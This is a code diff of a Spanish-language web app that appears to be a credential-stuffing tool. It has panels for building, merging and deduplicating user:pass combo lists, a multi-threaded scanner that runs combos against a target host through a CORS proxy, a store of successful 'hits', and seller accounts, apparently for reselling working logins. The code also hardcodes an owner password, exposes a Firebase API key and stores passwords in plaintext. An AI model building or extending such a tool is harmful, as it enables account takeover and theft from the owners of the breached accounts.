+            <button id="btnDescargarComboGen" class="btn-block btn-save" disabled onclick="descargarComboGenerado()">DESCARGAR</button>
         </div>
-        <div id="sub-merge" class="sub-panel">
-            <div class="form-group"><label>Archivo 1:</label><input type="file" id="mergeFile1" accept=".txt"></div>
-            <div class="form-group"><label>Archivo 2:</label><input type="file" id="mergeFile2" accept=".txt"></div>
-            <div class="form-group"><label>Archivo 3 (opcional):</label><input type="file" id="mergeFile3" accept=".txt"></div>
-            <button class="btn-block btn-start" onclick="unirCombos()">🔗 UNIR</button>
-            <textarea id="mergeResultado" rows="10" readonly></textarea>
-            <button id="btnDescargarMerge" class="btn-block btn-save" disabled onclick="descargarMergeResultado()">⬇️ DESCARGAR</button>
-        </div>
-        <div id="sub-dedupe" class="sub-panel">
-            <div class="form-group"><label>Archivo .txt:</label><input type="file" id="dedupeFile" accept=".txt"></div>
-            <div class="form-group"><label>...o pega texto:</label><textarea id="dedupeText" rows="6" placeholder="user:pass"></textarea></div>
-            <button class="btn-block btn-start" onclick="eliminarDuplicados()">🧹 ELIMINAR DUPLICADOS</button>
-            <textarea id="dedupeResultado" rows="10" readonly></textarea>
-            <button id="btnDescargarDedupe" class="btn-block btn-save" disabled onclick="descargarDedupeResultado()">⬇️ DESCARGAR</button>
-        </div>
+        <div id="sub-merge" class="sub-panel"><div class="form-group"><label>Archivo 1:</label><input type="file" id="mergeFile1"></div><div class="form-group"><label>Archivo 2:</label><input type="file" id="mergeFile2"></div><button class="btn-block btn-start" onclick="unirCombos()">UNIR</button><textarea id="mergeResultado" rows="8" readonly></textarea><button id="btnDescargarMerge" class="btn-block btn-save" disabled onclick="descargarMergeResultado()">DESCARGAR</button></div>
+        <div id="sub-dedupe" class="sub-panel"><div class="form-group"><label>Archivo:</label><input type="file" id="dedupeFile"></div><div class="form-group"><label>o pega texto:</label><textarea id="dedupeText" rows="4"></textarea></div><button class="btn-block btn-start" onclick="eliminarDuplicados()">ELIMINAR DUPLICADOS</button><textarea id="dedupeResultado" rows="8" readonly></textarea><button id="btnDescargarDedupe" class="btn-block btn-save" disabled onclick="descargarDedupeResultado()">DESCARGAR</button></div>
     </div>
 
-    <!-- PANEL SCANNER -->
+    <!-- ESCÁNER -->
     <div id="panel-scanner" class="panel">
         <div class="form-group"><label>Host:</label><input type="text" id="hostInput" placeholder="ej: lista.com:8080"></div>
-        <div class="form-group"><label>Combos archivos:</label><input type="file" id="comboFile1" accept=".txt"><input type="file" id="comboFile2" accept=".txt"><input type="file" id="comboFile3" accept=".txt"></div>
-        <div class="form-group"><label>...o pega combos:</label><textarea id="comboText" rows="3"></textarea></div>
+        <div class="form-group"><label>Archivos combo:</label><input type="file" id="comboFile1" accept=".txt"><input type="file" id="comboFile2" accept=".txt"><input type="file" id="comboFile3" accept=".txt"></div>
+        <div class="form-group"><label>o pega combos:</label><textarea id="comboText" rows="3"></textarea></div>
         <div class="form-group"><label>Conexiones:</label><input type="number" id="concurrencyInput" value="80"></div>
         <div class="checkbox-row" style="display:flex; gap:15px;"><label><input type="checkbox" id="useCors" checked> Proxy CORS</label><label><input type="checkbox" id="soundToggle" checked> Sonido</label><label><input type="checkbox" id="autoDownload" checked> Auto-Descarga</label></div>
         <button id="startBtn" class="btn-block btn-start" disabled>INICIAR SCAN</button>
         <button id="stopBtn" class="btn-block btn-stop" disabled>DETENER</button>
-        <button id="saveBtn" class="btn-block btn-save" disabled>GUARDAR HITS</button>
-        <div class="job-card"><div class="job-header"><span>Trabajo 1</span><span id="hitsCount1">Hits: 0</span></div><div class="progress-bar-bg"><div id="progressBarFill" class="progress-bar-fill"></div></div><div id="progressText">Procesados: 0 / 0</div><div id="currentCombo">-</div></div>
-        <div class="job-card"><div class="job-header"><span>Trabajo 2</span><span id="hitsCount2">Hits: 0</span></div><div class="progress-bar-bg"><div id="progressBarFill2" class="progress-bar-fill"></div></div><div id="progressText2">Procesados: 0 / 0</div><div id="currentCombo2">-</div></div>
-        <div class="job-card"><div class="job-header"><span>Trabajo 3</span><span id="hitsCount3">Hits: 0</span></div><div class="progress-bar-bg"><div id="progressBarFill3" class="progress-bar-fill"></div></div><div id="progressText3">Procesados: 0 / 0</div><div id="currentCombo3">-</div></div>
-        <div class="results-title">Resultados del Escaneo:</div><div id="hitsContainer"></div>
+        <button id="saveBtn" class="btn-block btn-save" disabled>GUARDAR TODO</button>
+        <div class="job-card"><div class="job-header"><span>Trabajo 1</span><span id="hitsCount1">Hits: 0</span></div><div class="progress-bar-bg"><div id="progressBarFill" class="progress-bar-fill"></div></div><div id="progressText">0/0</div><div id="currentCombo">-</div></div>
+        <div class="job-card"><div class="job-header"><span>Trabajo 2</span><span id="hitsCount2">Hits: 0</span></div><div class="progress-bar-bg"><div id="progressBarFill2" class="progress-bar-fill"></div></div><div id="progressText2">0/0</div><div id="currentCombo2">-</div></div>
+        <div class="job-card"><div class="job-header"><span>Trabajo 3</span><span id="hitsCount3">Hits: 0</span></div><div class="progress-bar-bg"><div id="progressBarFill3" class="progress-bar-fill"></div></div><div id="progressText3">0/0</div><div id="currentCombo3">-</div></div>
+        <div class="results-title">Resultados:</div><div id="hitsContainer"></div>
     </div>
 
-    <!-- PANEL BANCO HITS -->
-    <div id="panel-banco-hits" class="panel"><h3>🗄️ Hits Guardados</h3><div id="bancoHitsContainer" class="item-list"></div></div>
+    <!-- BANCO HITS -->
+    <div id="panel-banco-hits" class="panel"><h3>🗄️ Hits Guardados</h3><div id="bancoHitsContainer"></div></div>
 
-    <!-- PANEL ADMINS -->
-    <div id="panel-admins" class="panel"><h3>👥 Vendedores</h3><div class="item-card"><div class="form-group"><label>Correo:</label><input type="text" id="newAdminEmail"></div><div class="form-group"><label>Contraseña:</label><input type="text" id="newAdminPass"></div><button class="btn-block btn-start" onclick="crearVendedorFirebase()">CREAR VENDEDOR</button></div><h4>Lista:</h4><div id="listaVendedoresContainer"></div></div>
+    <!-- ADMINS -->
+    <div id="panel-admins" class="panel"><h3>👥 Vendedores</h3><div class="item-card"><div class="form-group"><label>Correo:</label><input type="text" id="newAdminEmail"></div><div class="form-group"><label>Contraseña:</label><input type="text" id="newAdminPass"></div><button class="btn-block btn-start" onclick="crearVendedorFirebase()">CREAR VENDEDOR</button></div><div id="listaVendedoresContainer"></div></div>
 
-    <!-- PANEL SOLICITUDES -->
+    <!-- SOLICITUDES -->
     <div id="panel-solicitudes" class="panel"><h3>📋 Solicitudes Pendientes</h3><div id="solicitudesContainer"></div></div>
 
-    <!-- PANEL CHAT -->
+    <!-- CHAT -->
     <div id="panel-chat" class="panel">
         <h3>💬 CHAT GENERAL</h3>
         <div class="profile-config"><div class="avatar-select" id="avatarSelect">🦁</div><input type="text" id="displayName" maxlength="20"><button class="btn-small btn-action" id="saveProfileBtn">Guardar</button></div>
-        <div class="chat-container"><div class="chat-messages" id="chatMessages"></div><div class="reply-badge" id="replyBadge" style="display:none;"><span>Respondiendo...</span><button id="cancelReplyBtn">❌</button></div><div class="chat-input-area"><textarea id="chatInput" class="chat-input" rows="2" placeholder="Escribe... @nombre"></textarea><button id="sendMsgBtn" class="btn-small btn-start">📤</button></div></div>
+        <div class="chat-container"><div class="chat-messages" id="chatMessages"></div><div class="reply-badge" id="replyBadge" style="display:none;"><span>Respondiendo...</span><button id="cancelReplyBtn">❌</button></div><div class="chat-input-area"><textarea id="chatInput" class="chat-input" rows="2"></textarea><button id="sendMsgBtn" class="btn-small btn-start">📤</button></div></div>
     </div>
 
-    <!-- PANEL JUEGO NUEVO -->
+    <!-- JUEGO -->
     <div id="panel-juego" class="panel">
-        <h3>🎮 Juego: Click Rápido (Mientras escaneas)</h3>
+        <h3>🎮 Click Rápido (juega mientras escaneas)</h3>
         <div class="game-container">
-            <div class="game-stats">
-                <span>✅ Puntos: <span id="gameScore">0</span></span>
-                <span>❌ Fallos: <span id="gameMisses">0</span></span>
-            </div>
-            <div class="game-area" id="gameArea">
-                <button id="movingBtn" class="moving-btn">🎯</button>
-            </div>
-            <div class="game-controls">
-                <button class="reset-game" id="resetGameBtn">Reiniciar Juego</button>
-            </div>
-            <p style="font-size:0.8rem;">Haz clic en el botón que se mueve. Cada acierto suma 1 punto, fallo suma 1 fallo.</p>
+            <div class="game-stats"><span>✅ Puntos: <span id="gameScore">0</span></span><span>❌ Fallos: <span id="gameMisses">0</span></span></div>
+            <div class="game-area" id="gameArea"><button id="movingBtn" class="moving-btn">🎯</button></div>
+            <div class="game-controls"><button class="reset-game" id="resetGameBtn">Reiniciar Juego</button></div>
         </div>
     </div>
 </div>
 
 <script>
-    // ==================== CONFIGURACIÓN GLOBAL ====================
+    // ========== CONFIGURACIÓN ==========
     const firebaseConfig = {
         apiKey: "AIzaSyDGE5GTlwIypuryIVnDYiTR9a2wyCgWkfs",
         authDomain: "gestion-ventas-pro-f8de4.firebaseapp.com",
@@ -733,10 +286,10 @@
     if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    let currentUser = null;
-    let usernameClave = "";
+    let currentUser = null, usernameClave = "";
+    let activeAbortControllers = []; // Para detener peticiones fetch
 
-    // EmailJS (opcional)
+    // EmailJS (opcional, igual que antes)
     const EMAILJS_PUBLIC_KEY = "TU_PUBLIC_KEY_AQUI";
     const EMAILJS_SERVICE_ID = "TU_SERVICE_ID_AQUI";
     const EMAILJS_TEMPLATE_ID = "TU_TEMPLATE_ID_AQUI";
@@ -744,156 +297,106 @@
 
     function limpiarClaveLocal(str){ return str.toLowerCase().trim().replace(/[\.\$\#\[\]\@]/g, "_"); }
 
-    // ==================== LOGIN / REGISTRO ====================
-    document.querySelectorAll('.auth-tab').forEach(tab=>{tab.addEventListener('click',function(){const target=this.getAttribute('data-auth');document.querySelectorAll('.auth-tab').forEach(t=>t.classList.remove('active'));this.classList.add('active');document.querySelectorAll('.auth-panel').forEach(p=>p.classList.remove('active'));document.getElementById(`auth-${target}`).classList.add('active');});});
-    function procesarLogin(){const email=document.getElementById('loginEmail').value.trim().toLowerCase(),pass=document.getElementById('loginPass').value.trim();if(!email||!pass){alert("Complete");return;}if((email==="andy"||email==="andyobregon799@gmail.com")&&pass==="andy799"){ingresarAlSistema(email,"Owner");return;}const nodo=limpiarClaveLocal(email);db.ref("vendedores/"+nodo).once("value").then(snap=>{if(snap.exists()&&snap.val().pass===pass)ingresarAlSistema(snap.val().email,"Seller");else alert("Credencial incorrecta");});}
+    // ========== LOGIN / REGISTRO / ADMIN ==========
+    document.querySelectorAll('.auth-tab').forEach(t=>t.addEventListener('click',function(){let target=this.getAttribute('data-auth');document.querySelectorAll('.auth-tab').forEach(t=>t.classList.remove('active'));this.classList.add('active');document.querySelectorAll('.auth-panel').forEach(p=>p.classList.remove('active'));document.getElementById(`auth-${target}`).classList.add('active');}));
+    function procesarLogin(){let email=document.getElementById('loginEmail').value.trim().toLowerCase(),pass=document.getElementById('loginPass').value.trim();if(!email||!pass){alert("Complete");return;}if((email==="andy"||email==="andyobregon799@gmail.com")&&pass==="andy799"){ingresarAlSistema(email,"Owner");return;}let nodo=limpiarClaveLocal(email);db.ref("vendedores/"+nodo).once("value").then(snap=>{if(snap.exists()&&snap.val().pass===pass)ingresarAlSistema(snap.val().email,"Seller");else alert("Credencial incorrecta");});}
     async function ingresarAlSistema(email,rol){currentUser={email,role:rol,uid:limpiarClaveLocal(email)};usernameClave=currentUser.uid;document.getElementById('auth-screen').style.display='none';document.getElementById('main-app').style.display='block';document.getElementById('userDisplay').textContent=`Activo: ${email} (${rol})`;if(rol==="Owner"){document.getElementById('tabAdminBtn').style.display='block';document.getElementById('tabSolicitudesBtn').style.display='block';escucharVendedores();escucharSolicitudesRegistro();}else{document.getElementById('tabAdminBtn').style.display='none';document.getElementById('tabSolicitudesBtn').style.display='none';}if(!localStorage.getItem('sys_urls'))localStorage.setItem('sys_urls',JSON.stringify({}));if(!localStorage.getItem('sys_saved_hits'))localStorage.setItem('sys_saved_hits',JSON.stringify({}));renderizarUrlsBloc();renderizarBancoHits();switchTab('combos');await cargarPerfilUsuario(email);iniciarChat();}
     function cerrarSesion(){if(window.chatUnsubscribe)window.chatUnsubscribe();if(window.solicitudesUnsubscribe)window.solicitudesUnsubscribe();currentUser=null;document.getElementById('loginEmail').value='';document.getElementById('loginPass').value='';document.getElementById('auth-screen').style.display='flex';document.getElementById('main-app').style.display='none';}
-    // vendedores
-    function crearVendedorFirebase(){const email=document.getElementById("newAdminEmail").value.trim(),pass=document.getElementById("newAdminPass").value.trim();if(!email||!pass){alert("Complete");return;}const nodo=limpiarClaveLocal(email);db.ref("vendedores/"+nodo).set({email,pass,fechaCreado:firebase.database.ServerValue.TIMESTAMP},()=>{alert("Registrado");document.getElementById("newAdminEmail").value="";document.getElementById("newAdminPass").value="";});}
-    function escucharVendedores(){db.ref("vendedores").on("value",(snap)=>{const cont=document.getElementById("listaVendedoresContainer");if(!cont)return;cont.innerHTML="";snap.forEach(h=>{const d=h.val();const div=document.createElement("div");div.className="item-card";div.innerHTML=`<div>👤 ${d.email} 🔑 ${d.pass}</div><div class="item-actions"><button class="btn-small btn-del" onclick="eliminarVendedorFirebase('${h.key}')">Eliminar</button></div>`;cont.appendChild(div);});});}
+    function crearVendedorFirebase(){let email=document.getElementById("newAdminEmail").value.trim(),pass=document.getElementById("newAdminPass").value.trim();if(!email||!pass){alert("Complete");return;}db.ref("vendedores/"+limpiarClaveLocal(email)).set({email,pass,fechaCreado:firebase.database.ServerValue.TIMESTAMP},()=>{alert("Registrado");document.getElementById("newAdminEmail").value="";document.getElementById("newAdminPass").value="";});}
+    function escucharVendedores(){db.ref("vendedores").on("value",(snap)=>{let cont=document.getElementById("listaVendedoresContainer");if(!cont)return;cont.innerHTML="";snap.forEach(h=>{let d=h.val();let div=document.createElement("div");div.className="item-card";div.innerHTML=`<div>👤 ${d.email} 🔑 ${d.pass}</div><div class="item-actions"><button class="btn-small btn-del" onclick="eliminarVendedorFirebase('${h.key}')">Eliminar</button></div>`;cont.appendChild(div);});});}
     function eliminarVendedorFirebase(key){if(confirm("Eliminar?"))db.ref("vendedores/"+key).remove();}
-    // solicitudes
-    function solicitarRegistro(){const email=document.getElementById('regEmail').value.trim().toLowerCase(),pass=document.getElementById('regPass').value.trim(),passC=document.getElementById('regPassConfirm').value.trim(),display=document.getElementById('regDisplayName').value.trim()||email.split('@')[0];if(!email||!pass||!passC){alert("Complete");return;}if(pass!==passC){alert("No coinciden");return;}if(pass.length<4){alert("Mínimo 4");return;}const nodo=limpiarClaveLocal(email);db.ref(`vendedores/${nodo}`).once('value').then(snap=>{if(snap.exists()){alert("Ya registrado");return;}db.ref('registro_solicitudes').orderByChild('email').equalTo(email).once('value').then(snapS=>{let pend=false;snapS.forEach(c=>{if(c.val().estado==='pendiente')pend=true;});if(pend){alert("Ya tienes solicitud pendiente");return;}db.ref('registro_solicitudes').push({email,password:pass,displayName:display,estado:'pendiente',fecha:firebase.database.ServerValue.TIMESTAMP}).then(()=>{alert("Solicitud enviada");document.getElementById('regEmail').value='';document.getElementById('regPass').value='';document.getElementById('regPassConfirm').value='';document.getElementById('regDisplayName').value='';document.querySelector('.auth-tab[data-auth="login"]').click();});});});}
+    function solicitarRegistro(){let email=document.getElementById('regEmail').value.trim().toLowerCase(),pass=document.getElementById('regPass').value.trim(),passC=document.getElementById('regPassConfirm').value.trim(),display=document.getElementById('regDisplayName').value.trim()||email.split('@')[0];if(!email||!pass||!passC){alert("Complete");return;}if(pass!==passC){alert("No coinciden");return;}if(pass.length<4){alert("Mínimo 4");return;}let nodo=limpiarClaveLocal(email);db.ref(`vendedores/${nodo}`).once('value').then(snap=>{if(snap.exists()){alert("Ya registrado");return;}db.ref('registro_solicitudes').orderByChild('email').equalTo(email).once('value').then(snapS=>{let pend=false;snapS.forEach(c=>{if(c.val().estado==='pendiente')pend=true;});if(pend){alert("Ya tienes solicitud");return;}db.ref('registro_solicitudes').push({email,password:pass,displayName:display,estado:'pendiente',fecha:firebase.database.ServerValue.TIMESTAMP}).then(()=>{alert("Solicitud enviada");document.getElementById('regEmail').value='';document.getElementById('regPass').value='';document.getElementById('regPassConfirm').value='';document.getElementById('regDisplayName').value='';document.querySelector('.auth-tab[data-auth="login"]').click();});});});}
     let solicitudesUnsubscribe=null;
-    function escucharSolicitudesRegistro(){if(solicitudesUnsubscribe)solicitudesUnsubscribe();const ref=db.ref('registro_solicitudes').orderByChild('estado').equalTo('pendiente');solicitudesUnsubscribe=ref.on('value',(snap)=>{const cont=document.getElementById('solicitudesContainer');const tabBtn=document.getElementById('tabSolicitudesBtn');if(!cont)return;cont.innerHTML='';let count=0;if(snap.exists()){snap.forEach(c=>{count++;const s=c.val();const fecha=s.fecha?new Date(s.fecha).toLocaleString():'desconocida';const div=document.createElement('div');div.className='item-card';div.innerHTML=`<div><strong>📧 ${s.email}</strong> | 🧑 ${s.displayName}</div><div>📅 ${fecha}</div><div class="item-actions"><button class="btn-small btn-approve" onclick="aprobarSolicitud('${c.key}','${s.email.replace(/'/g,"\\'")}','${s.password.replace(/'/g,"\\'")}','${s.displayName.replace(/'/g,"\\'")}')">✅ Aprobar</button><button class="btn-small btn-reject" onclick="rechazarSolicitud('${c.key}')">❌ Rechazar</button></div>`;cont.appendChild(div);});}else cont.innerHTML='<p>No hay solicitudes</p>';if(tabBtn){let badge=tabBtn.querySelector('.badge-pending');if(count>0){if(!badge)tabBtn.innerHTML=`📝 SOLICITUDES <span class="badge-pending">${count}</span>`;else badge.textContent=count;}else{if(badge)badge.remove();if(tabBtn.innerText.includes('('))tabBtn.innerHTML='📝 SOLICITUDES';}}});}
-    async function aprobarSolicitud(key,email,password,displayName){if(!confirm(`Aprobar a ${email}?`))return;const nodo=limpiarClaveLocal(email);try{await db.ref(`vendedores/${nodo}`).set({email,pass:password,fechaCreado:firebase.database.ServerValue.TIMESTAMP});await db.ref(`chat_profiles/${nodo}`).set({name:displayName||email.split('@')[0],avatar:'🦁'});await db.ref(`registro_solicitudes/${key}`).remove();alert(`✅ ${email} aprobado`);}catch(e){alert(e.message);}}
+    function escucharSolicitudesRegistro(){if(solicitudesUnsubscribe)solicitudesUnsubscribe();let ref=db.ref('registro_solicitudes').orderByChild('estado').equalTo('pendiente');solicitudesUnsubscribe=ref.on('value',(snap)=>{let cont=document.getElementById('solicitudesContainer'),tabBtn=document.getElementById('tabSolicitudesBtn');if(!cont)return;cont.innerHTML='';let count=0;if(snap.exists()){snap.forEach(c=>{count++;let s=c.val();let fecha=s.fecha?new Date(s.fecha).toLocaleString():'desconocida';let div=document.createElement('div');div.className='item-card';div.innerHTML=`<div><strong>📧 ${s.email}</strong> | 🧑 ${s.displayName}</div><div>📅 ${fecha}</div><div class="item-actions"><button class="btn-small btn-approve" onclick="aprobarSolicitud('${c.key}','${s.email.replace(/'/g,"\\'")}','${s.password.replace(/'/g,"\\'")}','${s.displayName.replace(/'/g,"\\'")}')">✅ Aprobar</button><button class="btn-small btn-reject" onclick="rechazarSolicitud('${c.key}')">❌ Rechazar</button></div>`;cont.appendChild(div);});}else cont.innerHTML='<p>Sin solicitudes</p>';if(tabBtn){let badge=tabBtn.querySelector('.badge-pending');if(count>0){if(!badge)tabBtn.innerHTML=`📝 SOLICITUDES <span class="badge-pending">${count}</span>`;else badge.textContent=count;}else{if(badge)badge.remove();if(tabBtn.innerText.includes('('))tabBtn.innerHTML='📝 SOLICITUDES';}}});}
+    async function aprobarSolicitud(key,email,password,displayName){if(!confirm(`Aprobar a ${email}?`))return;let nodo=limpiarClaveLocal(email);try{await db.ref(`vendedores/${nodo}`).set({email,pass:password,fechaCreado:firebase.database.ServerValue.TIMESTAMP});await db.ref(`chat_profiles/${nodo}`).set({name:displayName||email.split('@')[0],avatar:'🦁'});await db.ref(`registro_solicitudes/${key}`).remove();alert(`✅ ${email} aprobado`);}catch(e){alert(e.message);}}
     async function rechazarSolicitud(key){if(confirm("Rechazar?"))await db.ref(`registro_solicitudes/${key}`).remove();}
-    // recuperación
+
+    // ========== RECUPERACIÓN ==========
     const resetModal=document.getElementById('resetModal'),closeModal=document.querySelector('.close-modal'),forgotLink=document.getElementById('forgotPasswordLink');let resetEmailTemp="";
     forgotLink.onclick=e=>{e.preventDefault();resetModal.style.display='flex';document.getElementById('resetStep1').style.display='block';document.getElementById('resetStep2').style.display='none';document.getElementById('resetMsg').innerHTML='';document.getElementById('resetEmail').value='';document.getElementById('resetCode').value='';document.getElementById('newPassword').value='';document.getElementById('confirmNewPassword').value='';};
     closeModal.onclick=()=>resetModal.style.display='none';window.onclick=e=>{if(e.target===resetModal)resetModal.style.display='none';};
     function generarCodigo(){return Math.floor(100000+Math.random()*900000).toString();}
-    async function solicitarCodigoReset(){const email=document.getElementById('resetEmail').value.trim().toLowerCase();if(!email){alert("Ingresa correo");return;}const nodo=limpiarClaveLocal(email);const snap=await db.ref(`vendedores/${nodo}`).once('value');if(!snap.exists()){alert("No existe cuenta");return;}const code=generarCodigo();const expiresAt=Date.now()+5*60*1000;await db.ref(`reset_codes/${nodo}`).set({code,expiresAt,email});resetEmailTemp=email;if(EMAILJS_PUBLIC_KEY!=="TU_PUBLIC_KEY_AQUI"&&EMAILJS_SERVICE_ID!=="TU_SERVICE_ID_AQUI"&&EMAILJS_TEMPLATE_ID!=="TU_TEMPLATE_ID_AQUI"){try{await emailjs.send(EMAILJS_SERVICE_ID,EMAILJS_TEMPLATE_ID,{to_email:email,code:code,subject:"Código recuperación"});document.getElementById('resetMsg').innerHTML='<span style="color:green;">✅ Código enviado</span>';document.getElementById('resetStep1').style.display='none';document.getElementById('resetStep2').style.display='block';}catch(err){document.getElementById('resetMsg').innerHTML='<span style="color:red;">❌ Error EmailJS</span>';}}else{console.warn("Código:",code);alert(`[DEMO] Código: ${code}`);document.getElementById('resetMsg').innerHTML='<span>⚠️ Modo demo, revisa consola</span>';document.getElementById('resetStep1').style.display='none';document.getElementById('resetStep2').style.display='block';}}
-    async function verificarCodigoYResetear(){const code=document.getElementById('resetCode').value.trim(),newPass=document.getElementById('newPassword').value.trim(),confirmPass=document.getElementById('confirmNewPassword').value.trim();if(!code||!newPass||!confirmPass){alert("Complete");return;}if(newPass.length<4){alert("Mínimo 4 caracteres");return;}if(newPass!==confirmPass){alert("No coinciden");return;}const email=resetEmailTemp;if(!email){alert("Reinicia proceso");resetModal.style.display='none';return;}const nodo=limpiarClaveLocal(email);const snap=await db.ref(`reset_codes/${nodo}`).once('value');if(!snap.exists()){alert("Código inválido");return;}const data=snap.val();if(Date.now()>data.expiresAt){alert("Expirado");await db.ref(`reset_codes/${nodo}`).remove();return;}if(data.code!==code){alert("Código incorrecto");return;}await db.ref(`vendedores/${nodo}`).update({pass:newPass});await db.ref(`reset_codes/${nodo}`).remove();alert("Contraseña restablecida");resetModal.style.display='none';document.getElementById('loginEmail').value=email;}
-    // BLOC URLS
-    function guardarUrlBloc(){const val=document.getElementById('inputUrlData').value.trim(),editId=document.getElementById('editUrlId').value;if(!val)return;let base=JSON.parse(localStorage.getItem('sys_urls'))||{};if(!base[usernameClave])base[usernameClave]=[];if(editId!==""){base[usernameClave][parseInt(editId)]=val;document.getElementById('editUrlId').value="";document.getElementById('lblUrlForm').textContent="Agregar nueva URL:";}else base[usernameClave].push(val);localStorage.setItem('sys_urls',JSON.stringify(base));document.getElementById('inputUrlData').value="";renderizarUrlsBloc();}
+    async function solicitarCodigoReset(){let email=document.getElementById('resetEmail').value.trim().toLowerCase();if(!email){alert("Ingresa correo");return;}let nodo=limpiarClaveLocal(email);let snap=await db.ref(`vendedores/${nodo}`).once('value');if(!snap.exists()){alert("No existe cuenta");return;}let code=generarCodigo();let expiresAt=Date.now()+5*60*1000;await db.ref(`reset_codes/${nodo}`).set({code,expiresAt,email});resetEmailTemp=email;if(EMAILJS_PUBLIC_KEY!=="TU_PUBLIC_KEY_AQUI"&&EMAILJS_SERVICE_ID!=="TU_SERVICE_ID_AQUI"&&EMAILJS_TEMPLATE_ID!=="TU_TEMPLATE_ID_AQUI"){try{await emailjs.send(EMAILJS_SERVICE_ID,EMAILJS_TEMPLATE_ID,{to_email:email,code:code,subject:"Código recuperación"});document.getElementById('resetMsg').innerHTML='<span style="color:#00cc66;">✅ Código enviado</span>';document.getElementById('resetStep1').style.display='none';document.getElementById('resetStep2').style.display='block';}catch(err){document.getElementById('resetMsg').innerHTML='<span style="color:#ff6666;">Error EmailJS</span>';}}else{console.warn("Código:",code);alert(`[DEMO] Código: ${code}`);document.getElementById('resetMsg').innerHTML='<span>⚠️ Modo demo</span>';document.getElementById('resetStep1').style.display='none';document.getElementById('resetStep2').style.display='block';}}
+    async function verificarCodigoYResetear(){let code=document.getElementById('resetCode').value.trim(),newPass=document.getElementById('newPassword').value.trim(),confirmPass=document.getElementById('confirmNewPassword').value.trim();if(!code||!newPass||!confirmPass){alert("Complete");return;}if(newPass.length<4){alert("Mínimo 4");return;}if(newPass!==confirmPass){alert("No coinciden");return;}let email=resetEmailTemp;if(!email){alert("Reinicia proceso");resetModal.style.display='none';return;}let nodo=limpiarClaveLocal(email);let snap=await db.ref(`reset_codes/${nodo}`).once('value');if(!snap.exists()){alert("Código inválido");return;}let data=snap.val();if(Date.now()>data.expiresAt){alert("Expirado");await db.ref(`reset_codes/${nodo}`).remove();return;}if(data.code!==code){alert("Código incorrecto");return;}await db.ref(`vendedores/${nodo}`).update({pass:newPass});await db.ref(`reset_codes/${nodo}`).remove();alert("Contraseña restablecida");resetModal.style.display='none';document.getElementById('loginEmail').value=email;}
+
+    // ========== BLOC URLS ==========
+    function guardarUrlBloc(){let val=document.getElementById('inputUrlData').value.trim(),editId=document.getElementById('editUrlId').value;if(!val)return;let base=JSON.parse(localStorage.getItem('sys_urls'))||{};if(!base[usernameClave])base[usernameClave]=[];if(editId!==""){base[usernameClave][parseInt(editId)]=val;document.getElementById('editUrlId').value="";}else base[usernameClave].push(val);localStorage.setItem('sys_urls',JSON.stringify(base));document.getElementById('inputUrlData').value="";renderizarUrlsBloc();}
     function renderizarUrlsBloc(){let base=JSON.parse(localStorage.getItem('sys_urls'))||{},cont=document.getElementById('listaUrlsContainer');cont.innerHTML='';let mis=base[usernameClave]||[];if(mis.length===0){cont.innerHTML='<p>No hay URLs</p>';return;}mis.forEach((url,idx)=>{let div=document.createElement('div');div.className='item-card';div.innerHTML=`<div>🌐 ${url}</div><div class="item-actions"><button class="btn-small btn-copy" onclick="usarUrlEscanner(${idx})">🔌 Escanear</button><button class="btn-small btn-del" onclick="eliminarUrl(${idx})">Eliminar</button></div>`;cont.appendChild(div);});}
     function usarUrlEscanner(idx){let base=JSON.parse(localStorage.getItem('sys_urls'));document.getElementById('hostInput').value=base[usernameClave][idx].split(" - ")[0].trim();switchTab('scanner');}
     function eliminarUrl(idx){let base=JSON.parse(localStorage.getItem('sys_urls'));base[usernameClave].splice(idx,1);localStorage.setItem('sys_urls',JSON.stringify(base));renderizarUrlsBloc();}
-    // BANCO HITS
-    function guardarHitEnBanco(texto,user,pass){let base=JSON.parse(localStorage.getItem('sys_saved_hits'))||{};if(!base[usernameClave])base[usernameClave]=[];if(base[usernameClave].some(h=>h.user===user&&h.pass===pass))return;const ahora=new Date();base[usernameClave].push({id:Date.now()+Math.random(),user,pass,texto,copies:0,fecha:ahora.toLocaleString(),timestamp:ahora.getTime()});localStorage.setItem('sys_saved_hits',JSON.stringify(base));renderizarBancoHits();}
+
+    // ========== BANCO HITS ==========
+    function guardarHitEnBanco(texto,user,pass){let base=JSON.parse(localStorage.getItem('sys_saved_hits'))||{};if(!base[usernameClave])base[usernameClave]=[];if(base[usernameClave].some(h=>h.user===user&&h.pass===pass))return;let ahora=new Date();base[usernameClave].push({id:Date.now()+Math.random(),user,pass,texto,copies:0,fecha:ahora.toLocaleString(),timestamp:ahora.getTime()});localStorage.setItem('sys_saved_hits',JSON.stringify(base));renderizarBancoHits();}
     function renderizarBancoHits(){let base=JSON.parse(localStorage.getItem('sys_saved_hits'))||{},cont=document.getElementById('bancoHitsContainer');cont.innerHTML='';let mis=base[usernameClave]||[];if(mis.length===0){cont.innerHTML='<p>Sin hits</p>';return;}mis.sort((a,b)=>(b.timestamp||0)-(a.timestamp||0));mis.forEach(h=>{let div=document.createElement('div');div.className='hit-block';div.innerHTML=`<div class="hit-header"><span>👤 ${h.user}</span><span class="counter-badge">Copias: ${h.copies||0}</span></div><div class="hit-date">📅 ${h.fecha}</div><pre class="hit-content">${h.texto}</pre><div class="item-actions"><button class="btn-small btn-copy" onclick="copiarHitConContador(${h.id})">📋 Copiar</button><button class="btn-small btn-del" onclick="borrarHitBanco(${h.id})">Eliminar</button></div>`;cont.appendChild(div);});}
     function copiarHitConContador(id){let base=JSON.parse(localStorage.getItem('sys_saved_hits'));let item=base[usernameClave].find(h=>h.id==id);if(item){item.copies=(item.copies||0)+1;localStorage.setItem('sys_saved_hits',JSON.stringify(base));navigator.clipboard.writeText(item.texto);renderizarBancoHits();}}
     function borrarHitBanco(id){let base=JSON.parse(localStorage.getItem('sys_saved_hits'));base[usernameClave]=base[usernameClave].filter(h=>h.id!=id);localStorage.setItem('sys_saved_hits',JSON.stringify(base));renderizarBancoHits();}
-    // SWITCH TABS
-    function switchTab(tabName){document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));document.getElementById('panel-'+tabName).classList.add('active');let btn=Array.from(document.querySelectorAll('.tab-btn')).find(b=>b.getAttribute('onclick')?.includes(tabName));if(btn)btn.classList.add('active');if(tabName==='chat')cargarMensajesChat();}
-    // COMBOS (resumido para espacio, pero funciona igual)
-    const nombresReales=["juan","pedro","carlos","luis","andres"]; // solo muestra, pero completo en original
